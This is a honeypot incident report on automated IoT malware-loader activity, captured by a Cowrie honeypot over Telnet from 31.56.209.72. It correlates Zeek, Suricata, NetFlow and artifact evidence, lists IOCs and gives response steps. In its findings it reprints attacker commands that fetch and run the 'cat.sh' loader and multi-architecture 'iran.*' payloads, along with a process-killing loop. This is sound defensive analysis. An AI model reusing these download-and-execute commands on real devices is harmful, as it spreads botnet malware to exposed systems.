# DShield Cowrie Honeypot Attack Observation Report

## Telnet-Based Automated Linux/IoT Malware Loader Activity from `31.56.209.72`

> **Prepared by:** Xerckiem Mercado  
> **Date Prepared:** `[INSERT DATE]`  
> **Environment:** DShield Cowrie Honeypot, Security Onion, Zeek, Suricata, NetFlow, Elastic Agent, PCAP  
> **Primary External IP:** `31.56.209.72`  
> **Target Honeypot IP:** `192.168.50.200`  
> **Public/NAT IP Observed in Flow Records:** `24.126.27.47`  
> **Target Service:** Telnet  
> **Target Port:** `23` externally / `2223` observed in Cowrie endpoint telemetry  
> **Credential Used:** `telecomadmin / admintelecom`  
> **Assessment:** Automated Linux/IoT malware loader activity consistent with publicly documented IoT botnet-style infection workflows. Specific malware-family attribution and successful botnet enrollment are not confirmed.

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)  
2. [Key Findings](#2-key-findings)  
3. [Evidence Index](#3-evidence-index)  
4. [Timeline of Events](#4-timeline-of-events)  
5. [Network and NAT Interpretation](#5-network-and-nat-interpretation)  
6. [Attack Chain Analysis](#6-attack-chain-analysis)  
7. [Artifact Analysis](#7-artifact-analysis)  
8. [Indicators of Compromise and Observed Indicators](#8-indicators-of-compromise-and-observed-indicators)  
9. [MITRE ATT&CK Mapping](#9-mitre-attck-mapping)  
10. [External Research Correlation](#10-external-research-correlation)  
11. [Impact Assessment](#11-impact-assessment)  
12. [Hypothetical Incident Response if Observed on a Real System](#12-hypothetical-incident-response-if-observed-on-a-real-system)  
13. [Limitations](#13-limitations)  
14. [Conclusion](#14-conclusion)  
15. [Reference Page](#15-reference-page)  

---

# 1. Executive Summary

On **2026-05-28 at approximately 22:34 UTC**, a DShield Cowrie honeypot recorded a Telnet-based login from source IP `31.56.209.72` using the credential pair `telecomadmin / admintelecom`. The activity was observed across multiple evidence sources, including the DShield portal, Security Onion Hunt, Zeek connection logs, Zeek HTTP/file logs, Suricata alerts, NetFlow records, Elastic endpoint telemetry, PCAP, Cowrie TTY replay, and Cowrie downloaded payload artifacts.

After authentication, the attacker executed a scripted post-login workflow. The activity included writable-directory testing, attempted process cleanup using `/proc`, downloading a shell script loader named `cat.sh`, attempting to execute the loader, attempting to retrieve multiple architecture-specific Linux payloads named `iran.*`, and attempting fallback reconstruction of an ARM ELF executable using repeated `echo -ne "\x.."` commands.

The investigation confirmed that the loader retrieval occurred on the network. Zeek HTTP logs showed successful `GET /cat.sh` requests from `192.168.50.200` to `31.56.209.72:80`, with the server returning `200 OK`, `1845` bytes, and MIME type `text/x-shellscript`. Zeek file logs confirmed the same file size and hashes, and Suricata generated an alert for a `curl` User-Agent retrieving `/cat.sh` from a dotted-quad IP address.

NetFlow records further strengthened the timeline by showing flow-level evidence for both the inbound Telnet connection and the outbound HTTP retrieval connections. The NetFlow records also showed both the internal honeypot-side traffic involving `192.168.50.200` and the public/NAT-side traffic involving `24.126.27.47`.

Local Cowrie artifact analysis identified three SHA-256-named artifacts associated with the source IP:

1. A 9-byte ASCII file containing `WRITABLE`, consistent with writable-directory testing.
2. A 1,845-byte POSIX shell script matching the `cat.sh` loader.
3. A 37,728-byte partial 32-bit ARM ELF executable artifact associated with the `iran.armv5l` reconstruction attempt.

This report assesses the activity as an **automated Linux/IoT malware deployment attempt** against a Cowrie honeypot. The behavior is consistent with publicly documented IoT botnet-style loader workflows, but this report does **not** confirm successful botnet enrollment, successful full malware execution, or attribution to a specific malware family.

---

# 2. Key Findings

## Finding 1 — Successful Telnet Authentication Was Observed

The DShield portal showed a login record from `31.56.209.72` on `2026-05-28` using:

```text
telecomadmin / admintelecom
```

The Telnet PCAP and Cowrie TTY replay confirmed the same login activity. The Cowrie prompt shown after login was:

```text
telecomadmin@auth-node-01:~$
```

This establishes the initial access point as a simulated successful Telnet login to the Cowrie honeypot.

> 📸 **Screenshot Placeholder — Figure 1:**  
> Insert DShield portal screenshot showing `2026-05-28`, source IP `31.56.209.72`, username `telecomadmin`, and password `admintelecom`.

> 📸 **Screenshot Placeholder — Figure 2:**  
> Insert Wireshark Follow TCP Stream screenshot showing Telnet login prompt, username `telecomadmin`, and password `admintelecom`.

---

## Finding 2 — Security Onion Confirmed the Inbound Telnet Session

Security Onion Hunt showed endpoint telemetry and Zeek connection logs for the inbound session.

**Endpoint event:**

```text
2026-05-28 18:33:58.875 -04:00
endpoint.events.network
31.56.209.72:39744 → 192.168.50.200:2223
host.name: teksystems
user.name: cowrie
process.name: python3.12
event.action: connection_accepted
community_id: 1:4/a+NHqL1MtUUlOS+AsaTI1d2Gs=
```

**Zeek connection event:**

```text
2026-05-28 18:34:00.097 -04:00
zeek.conn
31.56.209.72:39744 → 192.168.50.200:23
community_id: 1:H1BiaoaLucNgAoNaN7AQ/mST/7c=
```

The difference between port `23` and `2223` is consistent with a honeypot/redirected service configuration. Zeek observed the network-facing Telnet service on TCP port `23`, while endpoint telemetry observed the Cowrie process accepting the connection on its internal listener port.

> 📸 **Screenshot Placeholder — Figure 3:**  
> Insert Security Onion Hunt screenshot showing endpoint `connection_accepted` event from `31.56.209.72` to `192.168.50.200`.

> 📸 **Screenshot Placeholder — Figure 4:**  
> Insert Security Onion Hunt screenshot showing Zeek connection log for `31.56.209.72:39744 → 192.168.50.200:23`.

---

## Finding 3 — NetFlow Corroborated Telnet and HTTP Traffic

NetFlow records provided supporting flow-level evidence for the same activity observed in Zeek, Suricata, endpoint telemetry, PCAP, and Cowrie TTY replay.

The NetFlow records showed inbound Telnet-related traffic:

```text
2026-05-28 18:36:00.000 -04:00
netflow.log
31.56.209.72:39744 → 24.126.27.47:23
community_id: 1:HUITJ2+KvtrP7IAFpG/+9WxpoqQ=
```

```text
2026-05-28 18:36:00.000 -04:00
netflow.log
192.168.50.200:23 → 31.56.209.72:39744
community_id: 1:H1BiaoaLucNgAoNaN7AQ/mST/7c=
```

The NetFlow records also showed later Telnet-related flow records:

```text
2026-05-28 18:37:58.000 -04:00
netflow.log
31.56.209.72:39744 → 24.126.27.47:23
community_id: 1:HUITJ2+KvtrP7IAFpG/+9WxpoqQ=
```

```text
2026-05-28 18:37:58.000 -04:00
netflow.log
192.168.50.200:23 → 31.56.209.72:39744
community_id: 1:H1BiaoaLucNgAoNaN7AQ/mST/7c=
```

The internal Telnet NetFlow community ID `1:H1BiaoaLucNgAoNaN7AQ/mST/7c=` matched the Zeek Telnet connection community ID, strengthening the correlation between Zeek and NetFlow.

NetFlow also corroborated the outbound HTTP retrieval stage:

```text
2026-05-28 18:35:11.000 -04:00
netflow.log
192.168.50.200:47294 → 31.56.209.72:80
community_id: 1:/QOYPyYb71dhnrnWVbFyfI5e51s=
```

```text
2026-05-28 18:35:11.000 -04:00
netflow.log
192.168.50.200:47306 → 31.56.209.72:80
community_id: 1:3JquSLdod4QN+s1OEDss8fkWf7E=
```

The `47294` HTTP community ID matched the Zeek HTTP/file events for the `Wget/1.11.4` `/cat.sh` retrieval. The `47306` HTTP community ID matched the Suricata alert and Zeek file event for the `curl/7.38.0` `/cat.sh` retrieval.

NetFlow also showed public/NAT-side return or public-facing flows involving:

```text
31.56.209.72:80 → 24.126.27.47:47294
31.56.209.72:80 → 24.126.27.47:47306
```

These public/NAT-side flow records support the relationship between the external public/NAT address `24.126.27.47` and the internal honeypot IP `192.168.50.200`.

NetFlow does not show payload contents or commands, but it confirms that the timing, direction, ports, and community IDs align with the Telnet access and HTTP loader retrieval stages.

> 📸 **Screenshot Placeholder — Figure 5:**  
> Insert Security Onion Hunt screenshot showing NetFlow Telnet records involving `31.56.209.72:39744`, `24.126.27.47:23`, and `192.168.50.200:23`.

> 📸 **Screenshot Placeholder — Figure 6:**  
> Insert Security Onion Hunt screenshot showing NetFlow HTTP records involving `192.168.50.200:47294/47306 → 31.56.209.72:80`.

---

## Finding 4 — Attacker Conducted Writable Directory Testing

The Cowrie TTY replay showed the attacker testing several common Linux writable directories:

```text
/tmp
/var/tmp
/dev/shm
/var/run
```

Observed commands included:

```bash
echo WRITABLE >/tmp/.testfile 2>&1
ls -l /tmp/.testfile 2>&1
rm -f /tmp/.testfile 2>&1
```

The same pattern repeated for `/var/tmp`, `/dev/shm`, and `/var/run`.

Local artifact analysis confirmed a SHA-256 artifact containing only the string `WRITABLE`, which aligns with these writable-directory tests.

```text
Artifact: 0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7
Size: 9 bytes
Type: ASCII text
Content: WRITABLE
MD5: 0c170fe680f144851874a532f3e66dce
SHA1: 1b7b89de0c6ed1a37766e8ff0aa2fe3213d7a983
```

This artifact is assessed as a **writable-directory test artifact**, not a malware payload.

> 📸 **Screenshot Placeholder — Figure 7:**  
> Insert Cowrie TTY replay screenshot showing writable-directory testing commands.

> 📸 **Screenshot Placeholder — Figure 8:**  
> Insert terminal screenshot showing `cat` or `strings` output for hash `0dc95...` displaying `WRITABLE`.

---

## Finding 5 — Attacker Attempted Process Cleanup / Competition Removal

The TTY replay showed a scripted command attempting to iterate through `/proc/[0-9]*`, inspect process memory maps, and terminate suspicious processes:

```bash
for pid in /proc/[0-9]*; do ... kill -9 "$pid_num"; ... done
```

Cowrie’s shell emulation generated errors such as:

```text
-bash: for: command not found
-bash: if: command not found
-bash: while: command not found
```

Although the commands did not execute normally in Cowrie, the command structure indicates attempted process enumeration and termination. In real Linux malware workflows, this type of behavior can be associated with removal of competing malware or processes before payload deployment.

This behavior supports the assessment of automated malware-loader activity. It does not, by itself, prove a specific malware family.

> 📸 **Screenshot Placeholder — Figure 9:**  
> Insert Cowrie TTY replay screenshot showing `/proc/[0-9]*/maps` process loop and `kill -9` logic.

---

## Finding 6 — Loader Retrieval Was Confirmed by Cowrie, Zeek, Suricata, NetFlow, and PCAP

The attacker attempted to retrieve a loader script:

```bash
wget http://31.56.209.72/cat.sh || curl http://31.56.209.72/cat.sh -o cat.sh || echo DOWNLOAD_FAILED
```

The TTY replay showed successful retrieval:

```text
HTTP request sent, awaiting response... 200 OK
Length: 1845 (1.8017578125K) [text/x-sh]
Saving to: /home/cat.sh
/home/cat.sh saved [1845/1845]
```

Zeek HTTP confirmed the same loader retrieval:

```yaml
@timestamp: 2026-05-28T22:34:10.151Z
source.ip: 192.168.50.200
source.port: 47294
destination.ip: 31.56.209.72
destination.port: 80
http.method: GET
http.uri: /cat.sh
http.useragent: Wget/1.11.4
http.status_code: 200
http.status_message: OK
http.response.body.length: 1845
file.resp_mime_types: text/x-shellscript
community_id: 1:/QOYPyYb71dhnrnWVbFyfI5e51s=
```

Zeek file metadata confirmed:

```yaml
file.source: HTTP
file.mime_type: text/x-shellscript
file.bytes.seen: 1845
file.bytes.total: 1845
file.bytes.missing: 0
hash.md5: 95353f04087412d8adf9c9c4f01a1fc3
hash.sha1: d9313fcea6c221a4f634eeb3ddff27007e3c76e2
fuid: FsaKqU3aDTjESj2yia
```

Suricata also alerted on a second `/cat.sh` retrieval flow:

```yaml
@timestamp: 2026-05-28T22:34:10.470Z
rule.name: ET HUNTING curl User-Agent to Dotted Quad
signature_id: 2034567
source.ip: 192.168.50.200
source.port: 47306
destination.ip: 31.56.209.72
destination.port: 80
network.data.decoded: GET /cat.sh HTTP/1.0 Host: 31.56.209.72 User-Agent: curl/7.38.0
community_id: 1:3JquSLdod4QN+s1OEDss8fkWf7E=
```

NetFlow corroborated both HTTP retrieval flows approximately one minute later as flow records:

```text
192.168.50.200:47294 → 31.56.209.72:80
community_id: 1:/QOYPyYb71dhnrnWVbFyfI5e51s=
```

```text
192.168.50.200:47306 → 31.56.209.72:80
community_id: 1:3JquSLdod4QN+s1OEDss8fkWf7E=
```

These community IDs match the Zeek and Suricata records, confirming that the same HTTP flows were observed across multiple telemetry sources.

This confirms that `/cat.sh` retrieval occurred on the network, not only inside the TTY replay.

> 📸 **Screenshot Placeholder — Figure 10:**  
> Insert Security Onion Hunt screenshot showing Zeek HTTP event for `GET /cat.sh` using `Wget/1.11.4`.

> 📸 **Screenshot Placeholder — Figure 11:**  
> Insert Security Onion Hunt screenshot showing Zeek file event for `cat.sh`, including size `1845`, MIME type `text/x-shellscript`, MD5, SHA1, and FUID.

> 📸 **Screenshot Placeholder — Figure 12:**  
> Insert Security Onion Hunt screenshot showing Suricata alert `ET HUNTING curl User-Agent to Dotted Quad` with decoded payload `GET /cat.sh`.

> 📸 **Screenshot Placeholder — Figure 13:**  
> Insert Security Onion Hunt screenshot showing NetFlow records with matching community IDs for the two HTTP flows.

---

## Finding 7 — The `cat.sh` Loader Attempted Multi-Architecture Payload Deployment

Local artifact analysis confirmed that the hash below was the `cat.sh` loader:

```text
620e9a7dc1090c48edae5bb3374b9b0a7fc7fa3d1f4063f49e9fb10d11df8b15
```

Local analysis:

```text
Size: 1845 bytes
Type: POSIX shell script, ASCII text executable
MD5: 95353f04087412d8adf9c9c4f01a1fc3
SHA1: d9313fcea6c221a4f634eeb3ddff27007e3c76e2
```

The local MD5 and SHA1 match Zeek’s file telemetry for the `/cat.sh` download.

The script attempted to download and execute binaries for multiple CPU architectures:

```text
iran.x86_64
iran.aarch64
iran.m68k
iran.mips
iran.mipsel
iran.powerpc
iran.sparc
iran.sh4
iran.arc
iran.i486
iran.armv4l
iran.armv5l
iran.armv6l
iran.armv7l
```

Example script pattern:

```bash
wget http://31.56.209.72/iran.x86_64 || curl http://31.56.209.72/iran.x86_64 -o iran.x86_64; chmod 777 iran.x86_64; ./iran.x86_64 "" ;
```

This multi-architecture payload logic is one of the strongest indicators that the loader was intended for broad Linux/IoT targeting. The report does not conclude that these binaries executed successfully, only that the loader attempted to retrieve and execute them.

> 📸 **Screenshot Placeholder — Figure 14:**  
> Insert terminal screenshot showing the `cat.sh` artifact content with multiple `iran.*` payload download commands.

> 📸 **Screenshot Placeholder — Figure 15:**  
> Insert Cowrie TTY replay screenshot showing the `cat.sh` script contents displayed after download.

---

## Finding 8 — Partial ARM ELF Artifact Was Captured

Cowrie preserved a third artifact:

```text
7eb904f49dbac7c413e55b6854462abfed31c79c887a17cb60f71980e6944c68
```

Local analysis:

```text
Size: 37,728 bytes
Type: ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked
MD5: a68b306a8a6bd502525daf74e7015c58
SHA1: 0229d5f10c481bdd52aed4ab7a4f5bfe45833900
```

The `file` utility reported:

```text
ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, missing section headers at 113144
```

Further `readelf` analysis confirmed that the file contains a valid ELF32 ARM executable header:

```text
Class: ELF32
Data: 2's complement, little endian
Type: EXEC
Machine: ARM
Entry point address: 0x8190
Number of program headers: 3
```

However, `readelf` also reported:

```text
Error: Reading 400 bytes extends past end of file for section headers
```

The ELF header indicated that section headers start at byte offset `112,784`, but the captured file was only `37,728` bytes. This strongly indicates the artifact was incomplete, truncated, or only partially reconstructed during the session.

The first 16 bytes shown by `xxd` were:

```text
7f 45 4c 46 01 01 01 61 00 00 00 00 00 00 00 00
```

The bytes `7f 45 4c 46` are the ELF magic header. This confirms that the attacker’s fallback reconstruction process was writing the beginning of a Linux executable.

This artifact is assessed as a **partial ARM ELF payload artifact** associated with the `iran.armv5l` reconstruction attempt. It is not assessed as a confirmed fully functional malware sample.

> 📸 **Screenshot Placeholder — Figure 16:**  
> Insert terminal screenshot showing `file` output for `7eb904...` identifying it as an ARM ELF executable.

> 📸 **Screenshot Placeholder — Figure 17:**  
> Insert terminal screenshot showing `readelf -h` output with ELF32 ARM, entry point `0x8190`, and section header offset.

> 📸 **Screenshot Placeholder — Figure 18:**  
> Insert terminal screenshot showing `readelf` error indicating section headers extend past end of file.

> 📸 **Screenshot Placeholder — Figure 19:**  
> Insert terminal screenshot showing `xxd -g 1 -l 128` output beginning with `7f 45 4c 46`.

---

# 3. Evidence Index

| Evidence ID | Source | Description |
|---|---|---|
| E1 | DShield Portal | Shows login from `31.56.209.72` using `telecomadmin / admintelecom` on `2026-05-28`. |
| E2 | PCAP / Wireshark Follow TCP Stream | Shows cleartext Telnet login, commands, `/cat.sh` retrieval, and script content. |
| E3 | Cowrie TTY Replay | Shows full attacker command sequence, writable-directory tests, process-killer logic, loader retrieval, multi-architecture payload commands, and ELF reconstruction. |
| E4 | Security Onion Endpoint Telemetry | Shows Cowrie process `python3.12` accepting and disconnecting the session. |
| E5 | Zeek Conn | Confirms Telnet flow from `31.56.209.72:39744` to `192.168.50.200:23`. |
| E6 | Zeek HTTP | Confirms `GET /cat.sh` from `192.168.50.200` to `31.56.209.72:80` with `200 OK`. |
| E7 | Zeek File | Confirms HTTP file transfer of a 1,845-byte `text/x-shellscript` with MD5/SHA1 matching local `cat.sh`. |
| E8 | Suricata Alert | Alert `ET HUNTING curl User-Agent to Dotted Quad` confirms suspicious `/cat.sh` retrieval using `curl/7.38.0`. |
| E9 | NetFlow | Corroborates inbound Telnet and outbound HTTP flows, including internal and public/NAT perspectives. |
| E10 | Cowrie Downloaded Payload Dashboard | Shows three SHA-256 artifacts associated with `31.56.209.72`. |
| E11 | Local Artifact Analysis | Classifies artifacts as writable test file, shell loader, and partial ARM ELF payload artifact. |
| E12 | Readelf / xxd Analysis | Confirms ARM ELF header and incomplete/truncated ELF artifact. |

---

# 4. Timeline of Events

| Time UTC | Time EDT | Source | Event |
|---|---|---|---|
| 2026-05-28 22:33:58.875 | 18:33:58.875 | Endpoint | Cowrie process accepted connection from `31.56.209.72:39744` to `192.168.50.200:2223`. |
| 2026-05-28 22:34:00.097 | 18:34:00.097 | Zeek Conn | Network Telnet flow observed from `31.56.209.72:39744` to `192.168.50.200:23`. |
| 2026-05-28 22:34:01 | 18:34:01 | DShield Portal | Login record from `31.56.209.72` using `telecomadmin / admintelecom`. |
| 2026-05-28 22:34:08.728 | 18:34:08.728 | Endpoint | Cowrie host attempted outbound connection to `31.56.209.72:80`. |
| 2026-05-28 22:34:10.051 | 18:34:10.051 | Zeek Conn | HTTP connection from `192.168.50.200:47294` to `31.56.209.72:80`. |
| 2026-05-28 22:34:10.151 | 18:34:10.151 | Zeek HTTP | `GET /cat.sh` using `Wget/1.11.4`; server returned `200 OK`, 1,845 bytes. |
| 2026-05-28 22:34:10.250 | 18:34:10.250 | Zeek File | File transfer recorded as `text/x-shellscript`, 1,845 bytes, MD5 `95353f04087412d8adf9c9c4f01a1fc3`. |
| 2026-05-28 22:34:10.258 | 18:34:10.258 | Zeek Conn | Second HTTP connection from `192.168.50.200:47306` to `31.56.209.72:80`. |
| 2026-05-28 22:34:10.364 | 18:34:10.364 | Zeek HTTP | Second HTTP transaction for `/cat.sh` retrieval flow. |
| 2026-05-28 22:34:10.470 | 18:34:10.470 | Suricata / Zeek File | Suricata alert for `GET /cat.sh` using `curl/7.38.0`; Zeek file logs recorded same 1,845-byte script. |
| 2026-05-28 22:35:11.000 | 18:35:11.000 | NetFlow | Flow records show outbound HTTP flows from `192.168.50.200:47294/47306` to `31.56.209.72:80` and corresponding public/NAT-side flows. |
| 2026-05-28 22:36:00.000 | 18:36:00.000 | NetFlow | Flow records show Telnet traffic involving `31.56.209.72:39744`, `24.126.27.47:23`, and `192.168.50.200:23`. |
| 2026-05-28 22:34–22:37 | 18:34–18:37 | Cowrie TTY | Scripted payload deployment and partial ARM ELF reconstruction observed. |
| 2026-05-28 22:37:00.448 | 18:37:00.448 | Endpoint | Cowrie process recorded disconnect for the session. |
| 2026-05-28 22:37:58.000 | 18:37:58.000 | NetFlow | Additional flow records show Telnet traffic continuing in the same activity window. |

> **Note:** NetFlow timestamps may represent flow export time, flow end time, or aggregation timing depending on sensor configuration. They are used here as corroborating flow telemetry, not as exact packet timestamps. Packet-level timing is better represented by Zeek, Suricata, and PCAP.

---

# 5. Network and NAT Interpretation

The investigation observed both the internal honeypot IP and a public/NAT IP in flow records:

```text
192.168.50.200 — internal honeypot IP
24.126.27.47 — public/NAT IP observed in NetFlow records
```

Some NetFlow records showed traffic involving `24.126.27.47`, while Zeek and endpoint records showed traffic involving `192.168.50.200`. This is consistent with visibility from different network vantage points. NetFlow can show the public-facing/NAT side of a connection, while Zeek and endpoint telemetry can show the internal honeypot-side flow.

This explains why the same incident appears with different destination addresses in different telemetry sources.

Community IDs helped correlate events:

```text
Telnet internal flow:      1:H1BiaoaLucNgAoNaN7AQ/mST/7c=
HTTP Wget /cat.sh flow:   1:/QOYPyYb71dhnrnWVbFyfI5e51s=
HTTP curl /cat.sh flow:   1:3JquSLdod4QN+s1OEDss8fkWf7E=
```

The NetFlow records with different community IDs involving `24.126.27.47` are expected because NAT changes the five-tuple used to generate the community ID.

---

# 6. Attack Chain Analysis

## Phase 1 — Initial Access

The attacker connected to the honeypot over Telnet and authenticated using:

```text
telecomadmin / admintelecom
```

Evidence:

- DShield portal login record.
- PCAP showing cleartext login.
- Cowrie TTY prompt after login.
- Zeek Telnet connection log.
- Endpoint event showing Cowrie accepted the connection.
- NetFlow records showing Telnet traffic across internal and public/NAT views.

Assessment:

The attacker obtained simulated shell access through weak/default-style Telnet credentials. Since this occurred in Cowrie, no real system compromise occurred.

---

## Phase 2 — Environment and Writable Path Checks

The attacker tested writable paths using `.testfile` writes under:

```text
/tmp
/var/tmp
/dev/shm
/var/run
```

The recovered `WRITABLE` artifact confirms these tests were preserved by Cowrie.

Assessment:

This behavior is consistent with malware staging logic. Scripts commonly test writable directories before dropping payloads.

---

## Phase 3 — Process Cleanup Attempt

The attacker attempted to inspect `/proc/[0-9]*/maps` and kill suspicious processes using `kill -9`.

Assessment:

The command structure suggests attempted process cleanup or competition removal. This is commonly seen in malware ecosystems where multiple malware families compete for control of the same exposed devices. However, the command failed in Cowrie due to shell emulation limitations.

---

## Phase 4 — Loader Retrieval

The attacker attempted to retrieve `cat.sh` from:

```text
http://31.56.209.72/cat.sh
```

This retrieval was confirmed by:

- Cowrie TTY replay.
- PCAP.
- Zeek HTTP log.
- Zeek file log.
- Suricata alert.
- NetFlow flow telemetry.
- Local Cowrie artifact analysis.

Assessment:

This is confirmed loader retrieval over HTTP.

---

## Phase 5 — Multi-Architecture Payload Deployment Attempt

The `cat.sh` loader attempted to download and execute payloads for multiple architectures, including x86, ARM, MIPS, PowerPC, SPARC, SH4, ARC, and i486.

Assessment:

This behavior is consistent with IoT/Linux malware deployment workflows, where the attacker does not know the architecture of the target device in advance and attempts multiple binaries to increase the chance of successful execution.

---

## Phase 6 — Fallback ARM ELF Reconstruction

The TTY replay showed the attacker writing an `iran.armv5l` binary using repeated `echo -ne "\x.."` commands.

The reconstructed artifact was saved by Cowrie as:

```text
7eb904f49dbac7c413e55b6854462abfed31c79c887a17cb60f71980e6944c68
```

Static analysis showed the file began with ELF magic bytes and had an ELF32 ARM executable header, but the file was incomplete.

Assessment:

The attacker attempted to reconstruct an ARM executable payload locally. The captured artifact was incomplete or truncated, so successful execution is not confirmed.

---

# 7. Artifact Analysis

| SHA-256 | Size | Local Type | Classification | Notes |
|---|---:|---|---|---|
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | 9 bytes | ASCII text | Writable test artifact | Contains `WRITABLE`; count of 4 aligns with four writable path checks. |
| `620e9a7dc1090c48edae5bb3374b9b0a7fc7fa3d1f4063f49e9fb10d11df8b15` | 1,845 bytes | POSIX shell script | `cat.sh` loader | MD5/SHA1 matched Zeek file telemetry. |
| `7eb904f49dbac7c413e55b6854462abfed31c79c887a17cb60f71980e6944c68` | 37,728 bytes | ELF32 ARM executable | Partial ARM payload artifact | ELF header valid, but section headers extend past end of file. |

---

# 8. Indicators of Compromise and Observed Indicators

| Type | Indicator |
|---|---|
| Source IP | `31.56.209.72` |
| Related IP | `176.65.148.233` |
| Honeypot IP | `192.168.50.200` |
| Public/NAT IP | `24.126.27.47` |
| Protocol | Telnet |
| Target Port | `23` |
| Cowrie Listener Port | `2223` |
| Username | `telecomadmin` |
| Password | `admintelecom` |
| Loader URL | `http://31.56.209.72/cat.sh` |
| Payload URL Pattern | `http://31.56.209.72/iran.*` |
| Loader MD5 | `95353f04087412d8adf9c9c4f01a1fc3` |
| Loader SHA1 | `d9313fcea6c221a4f634eeb3ddff27007e3c76e2` |
| Loader SHA256 | `620e9a7dc1090c48edae5bb3374b9b0a7fc7fa3d1f4063f49e9fb10d11df8b15` |
| Partial ARM ELF SHA256 | `7eb904f49dbac7c413e55b6854462abfed31c79c887a17cb60f71980e6944c68` |
| Writable Test Artifact SHA256 | `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` |
| Suricata Rule | `ET HUNTING curl User-Agent to Dotted Quad` |
| Suricata SID | `2034567` |
| Zeek HTTP FUID | `FsaKqU3aDTjESj2yia` |
| Zeek HTTP FUID | `FjYPuU3D2bgsiM1Mlc` |
| HTTP Wget Community ID | `1:/QOYPyYb71dhnrnWVbFyfI5e51s=` |
| HTTP Curl Community ID | `1:3JquSLdod4QN+s1OEDss8fkWf7E=` |
| Telnet Internal Community ID | `1:H1BiaoaLucNgAoNaN7AQ/mST/7c=` |
| Telnet Public/NAT Community ID | `1:HUITJ2+KvtrP7IAFpG/+9WxpoqQ=` |
| HTTP Public/NAT Community ID | `1:KqRbP/4To6IvnSrkEWGIBKzXizE=` |
| HTTP Public/NAT Community ID | `1:aeBWudL9H6ikPS2NVfVpxsxtqyU=` |
| TTY File | `f1407495a9ea3943558a1e5764d8852303a6a4d56af879e6668890c7078aae30` |

---

# 9. MITRE ATT&CK Mapping

| Technique ID | Technique Name | Evidence | Confidence |
|---|---|---|---|
| `T1078` | Valid Accounts | Honeypot accepted `telecomadmin / admintelecom`. This represents simulated credential-based access. | Medium |
| `T1110` | Brute Force | DShield portal showed credential-based login attempts. Full brute-force sequence is not fully reconstructed in this report. | Low-Medium |
| `T1059` | Command and Scripting Interpreter | Attacker executed shell commands and attempted `sh cat.sh telnet`. | High |
| `T1105` | Ingress Tool Transfer | Zeek, Suricata, NetFlow, PCAP, and TTY confirm retrieval of `cat.sh` from external IP `31.56.209.72`. | High |
| `T1071.001` | Web Protocols | HTTP was used to retrieve `/cat.sh` and attempt retrieval of `iran.*` payloads. | High |
| `T1082` | System Information Discovery | Attacker ran `cat /proc/cpuinfo`. | Medium |
| `T1083` | File and Directory Discovery | Attacker tested writable directories and interacted with staged files. | Medium |
| Defense Evasion / Process Termination Behavior | Process cleanup attempt | Attacker attempted `/proc` process inspection and `kill -9` logic. | Medium |

> **Note:** MITRE ATT&CK mapping is used to describe observed behavior. It does not attribute the incident to a specific threat actor.

---

# 10. External Research Correlation

The observed behavior was compared against public reporting and research on IoT/Linux malware and botnet-style infection workflows.

Relevant similarities include:

1. **Telnet/SSH credential abuse:**  
   Public Mirai research describes IoT botnet workflows that scan for devices running Telnet or SSH and attempt credential-based access using hardcoded IoT credential dictionaries. [R1]

2. **Loader-based infection workflow:**  
   Mirai-style and Telnet bot-loader research describes infection chains where a successful login or exploit is followed by retrieval of a loader or payload from attacker-controlled infrastructure. [R1], [R4]

3. **Multi-architecture payload delivery:**  
   Public reporting on IoT botnet campaigns documents the use of payloads for multiple CPU architectures. This aligns with the observed `iran.x86_64`, `iran.mips`, `iran.armv5l`, and other architecture-specific payloads. [R2], [R3]

4. **Process killing / competition removal:**  
   Trend Micro reporting documents IoT malware competition behavior where botnet malware attempts to remove or kill competing malware processes. The observed `/proc/[0-9]*/maps` and `kill -9` logic is consistent with that behavior pattern. [R3]

The comparison supports the assessment that this activity is consistent with IoT/Linux botnet-style loader behavior. It does not prove specific malware-family attribution.

---

# 11. Impact Assessment

No production system compromise occurred because the target was a Cowrie honeypot. Cowrie simulated a vulnerable Telnet environment and captured the attacker’s behavior without exposing a real shell.

If this activity had occurred on a real Telnet-exposed Linux or IoT device, the attacker likely would have attempted to:

- Identify a writable staging directory.
- Remove competing malware or suspicious processes.
- Download and execute a shell loader.
- Retrieve architecture-specific Linux payloads.
- Execute the matching binary for the device architecture.
- Potentially enroll the device into attacker-controlled infrastructure.

Successful execution was not confirmed in this honeypot case.

---

# 12. Hypothetical Incident Response if Observed on a Real System

This section applies only if similar activity were observed on a real system, not the Cowrie honeypot.

## 12.1 Containment

Immediate actions:

- Isolate the affected host from the network.
- Block `31.56.209.72` at firewall and proxy controls.
- Block outbound HTTP requests to raw IP addresses where feasible.
- Disable Telnet access immediately.
- Preserve volatile data before rebooting if the device supports it.
- Collect relevant logs, memory/process listings, and network connections.

## 12.2 Investigation

Recommended checks:

- Review authentication logs for `telecomadmin`, `admintelecom`, and other weak/default credentials.
- Search for `cat.sh`, `iran.*`, and unknown executable files.
- Inspect `/tmp`, `/var/tmp`, `/dev/shm`, and `/var/run`.
- Review process lists for unknown binaries.
- Search for cron jobs, startup scripts, modified init/systemd files, and unauthorized SSH keys.
- Review outbound connections to `31.56.209.72` or similar infrastructure.
- Submit hashes to approved threat intelligence platforms if organizational policy allows.

## 12.3 Eradication

Recommended actions:

- Remove malicious scripts and binaries.
- Rotate all local credentials.
- Disable unused management services.
- Patch firmware or operating system packages.
- Reimage the device if it is an IoT or embedded system where trust cannot be restored.
- Remove persistence mechanisms if identified.

## 12.4 Recovery

Recommended actions:

- Restore from a known-good image where possible.
- Re-enable only required services.
- Restrict management access to VPN or trusted IP ranges.
- Monitor for recurring outbound HTTP requests, Telnet logins, or payload downloads.
- Validate that no unexpected processes or files remain.

## 12.5 Hardening Recommendations

Long-term controls:

- Disable Telnet.
- Use SSH only if remote management is required.
- Disable default credentials.
- Use strong unique passwords or key-based access.
- Restrict management interfaces from the public Internet.
- Segment IoT devices from sensitive networks.
- Alert on `wget` or `curl` downloading scripts from raw IP addresses.
- Alert on suspicious payload names such as `mips`, `armv5l`, `x86_64`, or architecture-specific binaries in writable directories.
- Monitor for outbound HTTP connections from systems that should not initiate them.

---

# 13. Limitations

1. **Honeypot Environment:**  
